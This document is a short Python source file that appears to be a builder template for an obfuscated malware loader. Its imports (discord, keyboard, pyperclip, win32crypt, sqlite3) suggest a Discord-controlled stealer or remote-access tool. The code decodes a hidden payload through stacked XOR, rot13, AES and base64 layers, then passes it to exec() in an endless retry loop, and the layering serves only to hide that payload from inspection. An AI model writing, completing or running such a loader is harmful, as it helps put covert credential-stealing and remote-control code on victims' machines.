import os
import random
import threading
from time import sleep
from zipfile import ZipFile
import discord
import pyautogui
import requests
from discord.ext import commands
from keyboard import read_event
import base64
import codecs
import sys
import pyperclip
from subprocess import call
import shutil
import sqlite3
import json
import win32crypt
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

def decrypt_code(encrypted_text, key):
    encrypted_bytes = base64.b64decode(encrypted_text)
    iv = encrypted_bytes[:AES.block_size]
    ciphertext = encrypted_bytes[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_bytes.decode()
def xor_to_text(xor_list, key):
    text_result = ""
    for xor_value in xor_list:
        char = chr(xor_value ^ key)
        text_result += char
    return text_result

while True:
    try:
        secert = "<BYPASS>"
        secretkey = "<BYPASS_KEY>"
        xorkey = <XORKEY>
        encoded_values = [int(value) for value in secert.strip('[]').split(', ')]
        secert = xor_to_text(encoded_values, xorkey)
        secert = codecs.encode(secert, 'rot13')
        secert = decrypt_code(secert, base64.b64decode(secretkey))
        unsecret = codecs.encode(secert, 'rot13')
        exec(base64.b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]](unsecret)))
    except:
        print("no code")
        sleep(20)
